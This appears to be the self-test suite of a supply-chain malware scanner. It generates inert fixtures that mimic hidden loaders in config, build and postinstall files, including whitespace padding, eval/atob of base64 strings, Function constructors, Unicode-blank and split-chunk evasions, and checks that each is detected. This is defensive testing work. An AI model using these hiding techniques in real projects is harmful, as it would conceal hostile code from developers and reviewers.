"""supply-chain-guard self-test. Run through tests/run (it loops over locales).

Every fixture is synthesized at runtime, one throwaway git repo per case, from short inert
fragments. Signature strings are split in this source so the toolkit's own tree scans clean;
no fixture is a working payload (bodies are filler such as "0;" repeated).
"""
import base64
import concurrent.futures
import hashlib
import json
import os
import shutil
import subprocess
import sys
import tempfile
import traceback

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BIN = os.path.join(ROOT, "bin")


def J(*parts):
    return "".join(parts)


# ---------------------------------------------------------------------------
# inert fragments
# ---------------------------------------------------------------------------
def GLOBAL_O(tag):
    return J("glo", "bal.o=", "'", tag, "'")


def ID(h):
    return J("_$", "_", h)


JSO = J("_$", "jso", "ToArr")
PRE1 = J("import { create", "Require } from 'module';")
PRE2 = J("const require = create", "Require(import.meta.url);")
PAD = " " * 2000
FN = J("Func", "tion")
EV = J("ev", "al")
AT = J("at", "ob")


def plain_body(tag, h, jso=False, size=6400):
    head = J(GLOBAL_O(tag), ";var ", ID(h), "=(function(a,g){var z=a.length;return [z,g]})('inert',0);")
    tail = J("var f=", FN, "('return 0');", (JSO + "([]);") if jso else "")
    return head + tail + "0;" * ((size - len(head) - len(tail)) // 2)


def b64_body(h, n=3700):
    raw = J("var ", ID(h), "=0;").encode() + b"0;" * n
    return base64.b64encode(raw).decode()


def ts_eval_atob(tag, h):
    return J(EV, '("', GLOBAL_O(tag), ';"+', AT, "('", b64_body(h), "'))")


def sha(s):
    if isinstance(s, str):
        s = s.encode("utf-8")
    return hashlib.sha256(s).hexdigest()


# ---------------------------------------------------------------------------
# harness
# ---------------------------------------------------------------------------
class Ctx(object):
    def __init__(self, base, name):
        self.dir = tempfile.mkdtemp(prefix=name[:30] + "-", dir=base)
        self.n = 0
        self.env = dict(os.environ)
        self.env["GIT_CONFIG_NOSYSTEM"] = "1"
        self.env["GIT_CONFIG_GLOBAL"] = os.path.join(base, "gitconfig")
        self.env["GIT_CEILING_DIRECTORIES"] = base
        self.env.pop("GITHUB_ACTIONS", None)
        for k in ("GITHUB_EVENT_NAME", "GITHUB_EVENT_PATH", "GITHUB_REPOSITORY", "GITHUB_STEP_SUMMARY",
                  "GITHUB_WORKSPACE", "GUARD_MODE", "GUARD_CHECKS", "GUARD_TOKEN", "GITHUB_TOKEN",
                  "GUARD_SELFTEST_SABOTAGE", "GUARD_NO_TOMLLIB", "GUARD_GITHUB_API"):
            self.env.pop(k, None)

    def path(self, *p):
        return os.path.join(self.dir, *p)

    def git(self, repo, *args, **kw):
        p = subprocess.run(["git", "-C", repo] + list(args), env=self.env, stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE, input=kw.get("input"))
        if p.returncode != 0 and not kw.get("ok"):
            raise AssertionError("git %s failed: %s" % (" ".join(args), p.stderr.decode(errors="replace")))
        return p.stdout.decode("utf-8", "replace").strip()

    def repo(self, files, commit=False, init=True, add=True):
        self.n += 1
        r = self.path("repo%d" % self.n)
        os.makedirs(r)
        for rel, content in files.items():
            full = os.path.join(r, rel)
            d = os.path.dirname(full)
            if not os.path.isdir(d):
                os.makedirs(d)
            if isinstance(content, str):
                content = content.encode("utf-8")
            with open(full, "wb") as fh:
                fh.write(content)
        if init:
            self.git(r, "init", "-q")
            if add and files:
                self.git(r, "add", "-A")
            if commit:
                self.git(r, "commit", "-q", "-m", "init")
        return r

    def run(self, tool, repo, *args, **kw):
        jp = self.path("out%d.json" % self.n)
        self.n += 1
        env = dict(self.env)
        env.update(kw.get("env") or {})
        cmd = ["bash", os.path.join(BIN, tool)]
        if tool != "guard-ci":
            cmd += ["--repo-dir", repo, "--json", jp]
        cmd += list(args)
        try:
            p = subprocess.run(cmd, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                               timeout=kw.get("timeout", 600))
        except subprocess.TimeoutExpired:
            raise AssertionError("%s did not finish within %ss" % (tool, kw.get("timeout", 600)))
        out = p.stdout.decode("utf-8", "replace")
        doc = None
        if os.path.exists(jp):
            with open(jp) as fh:
                doc = json.load(fh)
        return Result(p.returncode, out, doc)

    def run_raw(self, rel, *args, **kw):
        """Run ROOT/<rel> (e.g. tools/adoption-precheck) with exactly these args -> (rc, output)."""
        env = dict(self.env)
        env.update(kw.get("env") or {})
        p = subprocess.run(["bash", os.path.join(ROOT, rel)] + list(args), env=env, stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, timeout=kw.get("timeout", 600))
        return p.returncode, p.stdout.decode("utf-8", "replace")


class Result(object):
    def __init__(self, rc, out, doc):
        self.rc, self.out, self.doc = rc, out, doc
        self.findings = doc["findings"] if doc else []
        self.allowed = doc["allowlisted"] if doc else []
        self.checks = set(f["check"] for f in self.findings)

    def expect(self, rc, has=(), lacks=(), msg=""):
        probs = []
        if self.rc != rc:
            probs.append("exit %d, expected %d" % (self.rc, rc))
        for c in has:
            if c not in self.checks:
                probs.append("missing finding %s" % c)
        for c in lacks:
            if c in self.checks:
                probs.append("unexpected finding %s" % c)
        # hygiene for every run: no output line carries a payload body
        for line in self.out.splitlines():
            if len(line) > 700:
                probs.append("output line of %d chars" % len(line))
                break
            if "0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;" in line:
                probs.append("output line carries filler payload body")
                break
        if probs:
            tail = "\n".join(self.out.splitlines()[-12:])
            raise AssertionError("%s%s\n--- output tail ---\n%s" % (msg + ": " if msg else "", "; ".join(probs), tail))
        return self

    def at(self, check):
        return [(f["path"], f["line"]) for f in self.findings if f["check"] == check]

    def fp(self, check, path=None):
        for f in self.findings:
            if f["check"] == check and (path is None or f["path"] == path):
                return f["fingerprint"]
        raise AssertionError("no %s finding to take a fingerprint from:\n%s" % (check, self.out[-1500:]))


CASES = []


def case(fn):
    CASES.append(fn)
    return fn


def allow(*entries):
    return "".join("%s\t%s\t%s\t%s\n" % e for e in entries)


# ---------------------------------------------------------------------------
# real variant shapes
# ---------------------------------------------------------------------------
POSTCSS = "const config = {\n  plugins: {\n    tailwindcss: {},\n  },\n};\nexport default config;"


@case
def variant_f999_plain_mjs(c):
    body = PRE1 + "\n" + PRE2 + "\n" + POSTCSS + PAD + plain_body("5-864-du", "f999") + "\n"
    r = c.repo({"postcss.config.mjs": body, "README.md": "# app\n"})
    res = c.run("scan-payload", r).expect(1, has=["P1", "P2", "P3", "P4", "P6"])
    assert ("postcss.config.mjs", 1) in res.at("P1"), "preamble pair not reported at line 1"


@case
def variant_fae0_plain_js(c):
    body = PRE1 + "\n" + PRE2 + "\n" + "module.exports = { a: 1 };" + PAD + plain_body("5-1078-du", "fae0", jso=True) + "\n"
    r = c.repo({"packages/mcp/scripts/copy-config.js": body})
    res = c.run("scan-payload", r).expect(1, has=["P1", "P2", "P3"])
    assert len(res.at("P1")) >= 2


@case
def variant_d692_plain_mjs(c):
    for tag in ("5-860-du", "5-864-du"):
        body = PRE1 + "\n" + PRE2 + "\nawait main();" + PAD + plain_body(tag, "d692", jso=True) + "\n"
        r = c.repo({"studio-vscode/extension/esbuild.mjs": body})
        c.run("scan-payload", r).expect(1, has=["P1", "P2", "P3", "P4"])


@case
def variant_ts_eval_atob(c):
    body = (PRE1 + "\n" + PRE2 + "\nimport { db } from './db';\n\nawait db.migrate();" + PAD
            + ts_eval_atob("5-864-du", "f999") + "\n")
    r = c.repo({"server/src/db/migrate.ts": body})
    c.run("scan-payload", r).expect(1, has=["P1", "P2", "P3", "P4", "P5", "P5b", "P6"])


@case
def variant_cjs_without_preamble(c):
    body = "'use strict';\nconst fs = require('fs');\nmain();" + PAD + plain_body("5-864-du", "f999") + "\n"
    r = c.repo({"packages/playwright-analytics/scripts/postinstall.cjs": body,
                "packages/playwright-analytics/package.json":
                    '{"name":"x","scripts":{"postinstall":"node scripts/postinstall.cjs"}}\n'})
    c.run("scan-payload", r).expect(1, has=["P1", "P2", "P3", "P4", "P7"], lacks=["P6"])


@case
def variant_preamble_after_shebang_and_comments(c):
    body = ("#!/usr/bin/env node\n/**\n * Generates the legal pages.\n */\n// eslint-disable\n\n" + PRE1 + "\n"
            + PRE2 + "\nimport fs from 'fs';\nfs.writeFileSync('x', 'y');\n")
    r = c.repo({"scripts/legal/generate.mjs": body})
    res = c.run("scan-payload", r).expect(1, has=["P1", "P6"], lacks=["P2", "P3"])
    assert ("scripts/legal/generate.mjs", 7) in res.at("P1"), res.at("P1")


@case
def variant_preamble_pair_is_not_allowlistable(c):
    body = PRE1 + "\n" + PRE2 + "\nconsole.log(require.resolve('x'));\n"
    r = c.repo({"tool.mjs": body})
    first = c.run("scan-payload", r).expect(1, has=["P1", "P6"])
    with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
        fh.write(allow(("P1", "tool.mjs", sha(PRE1), "legit"), ("P6", "tool.mjs", first.fp("P6"), "legit loader")))
    c.git(r, "add", "-A")
    c.run("scan-payload", r).expect(1, has=["P1", "AL"], lacks=["P6"])


# ---------------------------------------------------------------------------
# evasions found in review
# ---------------------------------------------------------------------------
def _pad_case(c, pad, path="scripts/build.mjs"):
    body = "export default config;" + pad + "console.log(1);\n"
    return c.repo({path: body})


@case
def evasion_1500_tabs(c):
    c.run("scan-payload", _pad_case(c, "\t" * 1500)).expect(1, has=["P2"])


@case
def evasion_40_tabs(c):
    c.run("scan-payload", _pad_case(c, "\t" * 40)).expect(1, has=["P2b"], lacks=["P2"])


@case
def evasion_alternating_space_nbsp(c):
    c.run("scan-payload", _pad_case(c, "  " * 100)).expect(1, has=["P2"])


@case
def evasion_runs_of_149_separated_by_semicolon(c):
    pad = (" " * 149 + ";") * 12
    res = c.run("scan-payload", _pad_case(c, pad + "0;" * 300)).expect(1, has=["P3"], lacks=["P2"])
    assert res.findings


@case
def huge_unicode_blank_runs_are_findings_not_engine_errors(c):
    # 1500 NBSPs overflowed the PCRE JIT stack in the old scanner (error -46 -> "could not scan")
    for pad in (" " * 1500, " " * 100000, "　 " * 30000, "\t" * 200000):
        c.run("scan-payload", _pad_case(c, pad + "0;" * 3000)).expect(1, has=["P2"], msg="run of %d" % len(pad))


@case
def evasion_formfeed_vtab(c):
    c.run("scan-payload", _pad_case(c, "\f\v" * 100)).expect(1, has=["P2"])


@case
def evasion_u1680(c):
    c.run("scan-payload", _pad_case(c, " " * 200)).expect(1, has=["P2"])


@case
def evasion_ufeff(c):
    c.run("scan-payload", _pad_case(c, "﻿" * 200)).expect(1, has=["P2"])


@case
def evasion_every_unicode_blank_mixed(c):
    blanks = "\t\x0b\x0c   " + "".join(chr(x) for x in range(0x2000, 0x200b)) + "    　﻿"
    c.run("scan-payload", _pad_case(c, (blanks * 10)[:150])).expect(1, has=["P2"])
    c.run("scan-payload", _pad_case(c, (blanks * 10)[:149])).expect(0)


@case
def no_fp_u2800_in_comment(c):
    body = "/*" + "⠀" * 300 + "*/ const a = 1;\nexport default a;\n"
    c.run("scan-payload", c.repo({"src/a.js": body})).expect(0, lacks=["P2", "P2b", "P3"])


@case
def evasion_split_base64_chunks(c):
    b = b64_body("f999", 600)
    chunks = [b[i:i + 300] for i in range(0, len(b), 300)]
    body = "const p = [\n" + ",\n".join('  "%s"' % x for x in chunks) + "\n];\n" + J(
        "const s = ", AT, "(p.join(''));\n", EV, "(s);\n")
    res = c.run("scan-payload", c.repo({"scripts/gen.js": body})).expect(1, has=["P4", "P5"], lacks=["P5b"])
    assert any(p == "scripts/gen.js" for p, _l in res.at("P5"))
    # 499-char chunks (just under the old 500 bar) also trip P5b
    chunks = [b[i:i + 499] for i in range(0, len(b) - 499, 499)]
    body = "const p = [\n" + ",\n".join("  '%s'" % x for x in chunks) + "\n];\n" + J(
        "module.exports = ", FN, "(Buffer.from(p.join(''), 'base64').toString());\n")
    c.run("scan-payload", c.repo({"lib/x.cjs": body})).expect(1, has=["P4", "P5", "P5b"])


@case
def evasion_bare_function(c):
    body = J("const run = ", FN, "(data)();\n")
    c.run("scan-payload", c.repo({"a.cjs": body})).expect(1, has=["P4"])


@case
def evasion_globalthis_concat(c):
    body = J("globalThis['ev' + 'al']('1');\n")
    c.run("scan-payload", c.repo({"a.js": body})).expect(1, has=["P4"])


@case
def evasion_vm_run_in_this_context(c):
    body = J("require('vm').runIn", "ThisContext(code);\n")
    c.run("scan-payload", c.repo({"a.js": body})).expect(1, has=["P4"])


@case
def evasion_settimeout_string(c):
    body = J("set", "Timeout(\"run()\", 10);\n")
    c.run("scan-payload", c.repo({"a.ts": body})).expect(1, has=["P4"])


@case
def evasion_import_data_url(c):
    body = J("await import(", "'data:text/javascript,export default 1');\n")
    c.run("scan-payload", c.repo({"a.mjs": body})).expect(1, has=["P4"])


@case
def evasion_eval_in_jsx(c):
    body = J("export const C = () => <div>{", EV, "(x)}</div>;\n")
    c.run("scan-payload", c.repo({"src/C.jsx": body})).expect(1, has=["P4"])


@case
def evasion_create_require_new_url_mts(c):
    body = J("import { create", "Require } from 'node:module';\nconst req = create",
             "Require(new URL(import.meta.url));\n")
    c.run("scan-payload", c.repo({"src/x.mts": body})).expect(1, has=["P6"], lacks=["P1"])


@case
def evasion_postinstall_node_e_eval(c):
    cmd = J("node -e \\\"", EV, "(Buffer.from('aGk=','base64').toString())\\\"")
    pj = '{\n  "name": "x",\n  "scripts": {\n    "postinstall": "%s"\n  }\n}\n' % cmd
    res = c.run("scan-payload", c.repo({"package.json": pj})).expect(1, has=["P7"])
    assert res.at("P7") == [("package.json", 4)], res.at("P7")


@case
def evasion_node_shebang_extensionless(c):
    body = J("#!/usr/bin/env node\n", EV, "(process.argv[2]);\n")
    c.run("scan-payload", c.repo({"bin/tool": body})).expect(1, has=["P4"])


@case
def evasion_binary_attribute_and_nul_bytes(c):
    body = b"\x89PNG\r\n\x1a\n\x00\x00" + J(GLOBAL_O("5-864-du"), ";").encode() + b"\x00\xff\n"
    r = c.repo({"assets/logo.png": body, ".gitattributes": "*.png binary\n"})
    c.run("scan-payload", r).expect(1, has=["P1"])


@case
def binary_media_padding_scope(c):
    blob = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + b"\x07" + b"\t" * 20 + b"\x91" + b" " * 160 + b"\x92\xff\n"
    # a real binary image: deflate noise that looks like tabs/spaces is not hidden code
    c.run("scan-payload", c.repo({"tests/fixtures/scene.png": blob})).expect(0)
    c.run("scan-payload", c.repo({"tests/fixtures/scene.woff2": blob.replace(b"\x00", b"\x01")})).expect(0)
    # the same bytes in code, or a text file wearing a .png name, are still scanned
    c.run("scan-payload", c.repo({"scripts/run.js": blob})).expect(1, has=["P2", "P2b"])
    c.run("scan-payload", c.repo({"bin/run": b"#!/usr/bin/env node\n" + blob})).expect(1, has=["P2", "P2b"])
    text = ("x();" + " " * 200 + "y();\n").encode()
    c.run("scan-payload", c.repo({"assets/logo.png": text})).expect(1, has=["P2"])
    # signatures are never exempt
    c.run("scan-payload", c.repo({"a.png": blob + J(GLOBAL_O("5-864-du"), ";").encode()})).expect(1, has=["P1"])


@case
def evasion_padding_inside_lockfile(c):
    lock = '{\n  "lockfileVersion": 3,\n  "packages": {"": {"name": "x"}}\n}' + PAD + "0;\n"
    c.run("scan-payload", c.repo({"package-lock.json": lock})).expect(1, has=["P2"], lacks=["P3"])


@case
def evasion_min_js_and_map(c):
    body = "!function(){}();" + PAD + plain_body("5-864-du", "f999") + "\n"
    c.run("scan-payload", c.repo({"dist/app.min.js": body, "dist/app.js.map": body})).expect(
        1, has=["P1", "P2"], lacks=["P3"])


@case
def prefilter_hits_deep_in_file(c):
    # each file is selectable by exactly one prefilter pattern, with the hit far below line 1
    filler = "".join("const v%d = %d;\n" % (i, i) for i in range(400))
    files = {"p3.js": filler + "x-" * 400 + " " * 45 + "y-" * 150 + "\n" + filler,
             "p2.txt": filler + "a" + " " * 150 + "b\n" + filler,
             "p2b.txt": filler + "a" + "\t" * 16 + "b\n" + filler,
             "p4.js": filler + J("x = new ", FN, "('a');\n") + filler,
             "p5b.ts": filler + '"' + "QUJD" * 100 + '";\n' + filler}
    res = c.run("scan-payload", c.repo(files)).expect(1, has=["P2", "P2b", "P3", "P4", "P5b"])
    got = set((p, l) for p, l in res.at("P3") + res.at("P2") + res.at("P2b") + res.at("P4") + res.at("P5b"))
    assert got == {("p3.js", 401), ("p2.txt", 401), ("p2b.txt", 401), ("p4.js", 401), ("p5b.ts", 401)}, got


@case
def dense_match_file_stays_linear(c):
    # Every line hits one prefilter branch while the others never match. With several -e
    # patterns git grep's look-ahead re-scans the rest of the file per hit (quadratic: the 12k-line
    # version ran > 16 min). One combined pattern + gated python keeps this to a few seconds.
    import time
    data = ("A" * 600 + "\n") * 5000 + J(EV, "(x);\n")
    r = c.repo({"gen/blob.js": data})
    t0 = time.time()
    res = c.run("scan-payload", r, timeout=180).expect(1, has=["P4"])
    took = time.time() - t0
    assert took < 90, "dense file took %.0fs (quadratic scan?)" % took
    assert res.at("P4") == [("gen/blob.js", 5001)], res.at("P4")


@case
def odd_paths_and_nul_bytes_in_lines(c):
    files = {"we\nird:name 1.js": J("a\0b; ", EV, "(x);\n"),
             "sp ace/été.mjs": "x\n" + J("y\0", EV, "(1)\0;\n"),
             "plain.txt": "ok\n"}
    res = c.run("scan-payload", c.repo(files)).expect(1, has=["P4"])
    got = sorted(res.at("P4"))
    assert got == [("sp ace/été.mjs", 2), ("we\nird:name 1.js", 1)], got
    for line in res.out.splitlines():
        assert not line.startswith("ird:"), "raw newline from a path reached the log"


@case
def leading_150_blanks_then_code(c):
    c.run("scan-payload", c.repo({"a.txt": " " * 150 + "x\n"})).expect(1, has=["P2"])


# ---------------------------------------------------------------------------
# clean baselines
# ---------------------------------------------------------------------------
@case
def clean_111_space_alignment(c):
    tsx = "export const T = () => (\n  <div>" + " " * 111 + "{x}</div>\n);\n"
    snap = "exports[`a 1`] = `\n" + "│ name" + " " * 116 + "value │\n`;\n"
    c.run("scan-payload", c.repo({"src/StepHelpers.tsx": tsx, "__snapshots__/a.snap": snap})).expect(0)


@case
def clean_4099_char_inline_svg(c):
    d = " ".join("L%d %d" % (i % 97, i % 89) for i in range(700))
    head = 'export const LOGO = `<svg viewBox="0 0 64 64"><path d="M0 0 ' + d
    line = head[:4099 - 11] + '"/></svg>`;'
    assert len(line) == 4099, len(line)
    c.run("scan-payload", c.repo({"packages/sdk/src/html-logo.ts": line + "\n"})).expect(0)


@case
def clean_trailing_whitespace_and_crlf(c):
    body = "const a = 1;" + " " * 300 + "\nconst b = 2;" + " " * 300 + "\r\nconst c = 3;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n"
    c.run("scan-payload", c.repo({"a.js": body})).expect(0)


@case
def clean_legit_create_require_allowlisted(c):
    line2 = J("const require = create", "Require(import.meta.url);")
    body = J("import { create", "Require } from 'node:module';\n", line2, "\nexport const pkg = require('./package.json');\n")
    r = c.repo({"server/src/index.ts": body})
    c.run("scan-payload", r).expect(1, has=["P6"], lacks=["P1"])
    with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
        fh.write("# reviewed 2026-10-01\n" + allow(("P6", "server/src/index.ts", sha(line2), "ESM server needs require for JSON")))
    c.git(r, "add", "-A")
    res = c.run("scan-payload", r).expect(0)
    assert len(res.allowed) == 1


@case
def clean_legit_new_function_allowlisted(c):
    line = J("    const fn = new ", FN, "('a', 'return a + 1');")
    body = "import { test } from 'vitest';\ntest('overlay', () => {\n" + line + "\n});\n"
    r = c.repo({"__tests__/unit/overlay-conformance.test.ts": body})
    res = c.run("scan-payload", r).expect(1, has=["P4"])
    with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
        fh.write(allow(("P4", "__tests__/unit/overlay-conformance.test.ts", res.fp("P4"), "conformance test builds a fn")))
    c.git(r, "add", "-A")
    c.run("scan-payload", r).expect(0)


@case
def clean_allowlisted_lifecycle_script(c):
    pj = '{"name":"x","scripts":{"postinstall":"node scripts/postinstall.cjs"}}\n'
    r = c.repo({"package.json": pj})
    with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
        fh.write(allow(("P7", "package.json", sha("postinstall=node scripts/postinstall.cjs"), "prints a notice")))
    c.git(r, "add", "-A")
    c.run("scan-payload", r).expect(0)
    # same command moved to a different hook is a new finding
    with open(os.path.join(r, "package.json"), "w") as fh:
        fh.write('{"name":"x","scripts":{"preinstall":"node scripts/postinstall.cjs"}}\n')
    c.run("scan-payload", r).expect(1, has=["P7", "AL"])


# ---------------------------------------------------------------------------
# allowlist rules
# ---------------------------------------------------------------------------
def _p4_repo(c):
    return c.repo({"src/a.js": J(EV, "(x);\n")})


@case
def allowlist_glob_attempt(c):
    r = _p4_repo(c)
    fp = c.run("scan-payload", r).fp("P4")
    for entry in (("P4", "*", fp, "everything"), ("P4", "src/*.js", fp, "glob"), ("P4", "src/a.js", "*", "any fp"),
                  ("*", "src/a.js", fp, "any check")):
        with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
            fh.write(allow(entry))
        c.git(r, "add", "-A")
        c.run("scan-payload", r).expect(1, has=["AL", "P4"], msg="entry %r" % (entry,))


@case
def allowlist_stale_entry(c):
    r = c.repo({"a.txt": "hello\n", ".supply-chain-guard.allow": allow(("P4", "src/gone.js", "0" * 64, "old"))})
    res = c.run("scan-payload", r).expect(1, has=["AL"])
    assert "stale" in res.out
    # a stale entry for a check that did not run is not judged
    c.run("scan-payload", r, "--checks", "P1,P2").expect(0)


@case
def allowlist_forbidden_targets_and_ids(c):
    files = {"a.txt": "hello\n", ".github/workflows/ci.yml": GOOD_WF + "      - uses: actions/cache@v4\n",
             ".supply-chain-guard/x": "y\n"}
    r = c.repo(files)
    wf_fp = sha("actions/cache@v4")
    bad = [(("S6", ".github/workflows/ci.yml", wf_fp, "x"), "may not target .github/workflows"),
           (("P4", ".supply-chain-guard.allow", "0" * 64, "x"), "may not target the allowlist"),
           (("P4", ".supply-chain-guard/x", "0" * 64, "x"), "may not target .supply-chain-guard"),
           # P2/P2b/P3 are allowlistable only in inert data/doc files (round 2), never in code
           (("P2", "a.js", "0" * 64, "x"), "cannot be allowlisted"),
           (("P2b", "a.sh", "0" * 64, "x"), "cannot be allowlisted"),
           (("P3", "package.json", "0" * 64, "x"), "cannot be allowlisted"),
           (("P1", "a.txt", "0" * 64, "x"), "cannot be allowlisted"),
           (("P8", ".supply-chain-guard/x", "0" * 64, "x"), "cannot be allowlisted"),
           (("C2", "a.txt", "0" * 64, "x"), "cannot be allowlisted"),
           (("P4", "a.txt", "0" * 64, " "), "no reason"),
           (("P4", "../a.txt", "0" * 64, "x"), "normalized"),
           (("P4", "./a.txt", "0" * 64, "x"), "repo-relative"),
           (("P4", "/a.txt", "0" * 64, "x"), "repo-relative"),
           (("P4", "a.txt", "ABC", "x"), "64 lowercase hex"),
           (("P4", "a.txt", "0" * 63 + "*", "x"), "64 lowercase hex"),
           (("P4", "a?.txt", "0" * 64, "x"), "globs are not allowed"),
           (("P9", "a.txt", "0" * 64, "x"), "unknown check id")]
    for entry, why in bad:
        with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
            fh.write(allow(entry))
        c.git(r, "add", "-A")
        tool = "supply-chain-check" if entry[0].startswith("S") else "scan-payload"
        res = c.run(tool, r).expect(1, has=["AL"], msg="entry %r" % (entry,))
        msgs = [f["message"] for f in res.findings if f["check"] == "AL"]
        assert any(why in m for m in msgs), "entry %r: expected %r in %r" % (entry, why, msgs)
    # unknown ids are reported once (by scan-payload), not by both tools
    c.run("supply-chain-check", r).expect(1, has=["S6"], lacks=["AL"])
    with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
        fh.write("P4 a.txt 0000 reason with spaces not tabs\n")
    c.git(r, "add", "-A")
    res = c.run("scan-payload", r).expect(1, has=["AL"])
    assert any("4 TAB-separated" in f["message"] for f in res.findings)


@case
def allowlist_cannot_hide_padding(c):
    body = "export default config;" + PAD + plain_body("5-864-du", "f999") + "\n"
    r = c.repo({"postcss.config.mjs": body})
    first = c.run("scan-payload", r).expect(1, has=["P1", "P2", "P3", "P4"])
    with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
        fh.write(allow(("P4", "postcss.config.mjs", first.fp("P4"), "attacker-added")))
    c.git(r, "add", "-A")
    c.run("scan-payload", r).expect(1, has=["P1", "P2", "P3"], lacks=["P4"])


# ---------------------------------------------------------------------------
# fail closed
# ---------------------------------------------------------------------------
@case
def fail_closed_empty_checkout(c):
    r = c.repo({}, init=True)
    for tool in ("scan-payload", "supply-chain-check"):
        res = c.run(tool, r).expect(2)
        assert "0 tracked files" in res.out


@case
def fail_closed_not_a_git_repo(c):
    r = c.repo({"a.js": J(EV, "(x)\n")}, init=False)
    for tool in ("scan-payload", "supply-chain-check"):
        c.run(tool, r).expect(2)
    c.run("commit-provenance", r, "--range", "a..b").expect(2)
    c.run("scan-payload", c.path("does-not-exist")).expect(2)


@case
def fail_closed_tracked_file_missing(c):
    r = c.repo({"a.txt": "x\n", "b.txt": "y\n"})
    os.remove(os.path.join(r, "b.txt"))
    c.run("scan-payload", r).expect(2)


@case
def fail_closed_unknown_check_id(c):
    r = c.repo({"a.txt": "x\n"})
    c.run("scan-payload", r, "--checks", "P1,P9").expect(2)
    c.run("supply-chain-check", r, "--checks", "nope").expect(2)


@case
def fail_closed_git_grep_unavailable(c):
    fake = c.path("fakebin")
    os.makedirs(fake)
    real = shutil.which("git")
    with open(os.path.join(fake, "git"), "w") as fh:
        fh.write('#!/bin/sh\nfor a in "$@"; do [ "$a" = grep ] && { echo "fatal: cannot use Perl-compatible '
                 'regexes when not compiled with USE_LIBPCRE" >&2; exit 128; }; done\nexec %s "$@"\n' % real)
    os.chmod(os.path.join(fake, "git"), 0o700)
    r = c.repo({"a.txt": "x\n"})
    res = c.run("scan-payload", r, env={"PATH": fake + os.pathsep + c.env.get("PATH", "")}).expect(2)
    assert "PCRE" in res.out


@case
def fail_closed_canary_sabotage(c):
    r = c.repo({"a.txt": "x\n"})
    for chk in ("P1", "P2", "P2b", "P3", "P4", "P5", "P5b", "P6", "P7"):
        res = c.run("scan-payload", r, env={"GUARD_SELFTEST_SABOTAGE": chk}).expect(2, msg=chk)
        assert "canary" in res.out
    for chk in ("S1", "S2", "S3", "S4", "S5", "S6"):
        c.run("supply-chain-check", r, env={"GUARD_SELFTEST_SABOTAGE": chk}).expect(2, msg=chk)
    for chk in ("C1", "C2", "C3"):
        c.run("commit-provenance", r, "--range", "x..y", env={"GUARD_SELFTEST_SABOTAGE": chk}).expect(2, msg=chk)


@case
def output_never_prints_payload_body(c):
    body = "export default config;" + PAD + plain_body("5-864-du", "f999", size=9000) + "\n"
    res = c.run("scan-payload", c.repo({"postcss.config.mjs": body})).expect(1)
    for line in res.out.splitlines():
        assert len(line) < 500, "long output line: %d" % len(line)
    assert "[80 blanks]" in res.out or "blanks]" in res.out


@case
def unparseable_package_json(c):
    c.run("scan-payload", c.repo({"package.json": "{ not json\n"})).expect(1, has=["P7"])


# ---------------------------------------------------------------------------
# P8 local copy
# ---------------------------------------------------------------------------
def _copy_guard(dst):
    for sub in ("bin", "lib"):
        shutil.copytree(os.path.join(ROOT, sub), os.path.join(dst, sub),
                        ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
    shutil.copyfile(os.path.join(ROOT, "action.yml"), os.path.join(dst, "action.yml"))


@case
def p8_local_copy(c):
    r = c.repo({"a.txt": "x\n"}, add=False)
    _copy_guard(os.path.join(r, ".supply-chain-guard"))
    c.git(r, "add", "-A")
    c.run("scan-payload", r).expect(0)
    with open(os.path.join(r, ".supply-chain-guard", "lib", "guard", "payload.py"), "a") as fh:
        fh.write("# weakened\n")
    res = c.run("scan-payload", r).expect(1, has=["P8"])
    assert any(p.endswith("payload.py") for p, _l in res.at("P8"))
    os.remove(os.path.join(r, ".supply-chain-guard", "action.yml"))
    c.git(r, "add", "-A")
    res = c.run("scan-payload", r).expect(1, has=["P8"])
    assert any(p.endswith("action.yml") for p, _l in res.at("P8"))


@case
def toolkit_tree_scans_clean(c):
    r = c.repo({}, init=False)
    for sub in ("bin", "lib", "tests", "tools"):
        shutil.copytree(os.path.join(ROOT, sub), os.path.join(r, sub),
                        ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
    for f in ("action.yml", "README.md"):
        if os.path.exists(os.path.join(ROOT, f)):
            shutil.copyfile(os.path.join(ROOT, f), os.path.join(r, f))
    c.git(r, "init", "-q")
    c.git(r, "add", "-A")
    c.run("scan-payload", r).expect(0)
    c.run("supply-chain-check", r).expect(0)


# ---------------------------------------------------------------------------
# supply-chain-check
# ---------------------------------------------------------------------------
INTEG = "sha512-" + "A" * 86 + "=="
REG = "https://registry.npmjs.org/"


def npm_lock(extra):
    pk = {"": {"name": "app", "version": "1.0.0"},
          "node_modules/ok": {"version": "1.0.0", "resolved": REG + "ok/-/ok-1.0.0.tgz", "integrity": INTEG}}
    pk.update(extra)
    return json.dumps({"name": "app", "lockfileVersion": 3, "requires": True, "packages": pk}, indent=2) + "\n"


SHA40 = "b4ffde65f46336ab88eb53be808477a3936bae11"
GOOD_WF = ("name: ci\non:\n  push:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  test:\n"
           "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@%s # v4\n"
           "        with:\n          persist-credentials: false\n      - uses: ./.github/actions/local\n"
           "      - run: npm ci --ignore-scripts\n" % SHA40)


@case
def supply_clean_baseline(c):
    r = c.repo({"package-lock.json": npm_lock({}), "package.json": '{"dependencies":{"ok":"^1.0.0","a":"npm:b@^2"}}\n',
                ".github/workflows/ci.yml": GOOD_WF, ".npmrc": "registry=https://registry.npmjs.org/\n",
                "Dockerfile": "FROM node:20-alpine\nRUN echo hi\n"})
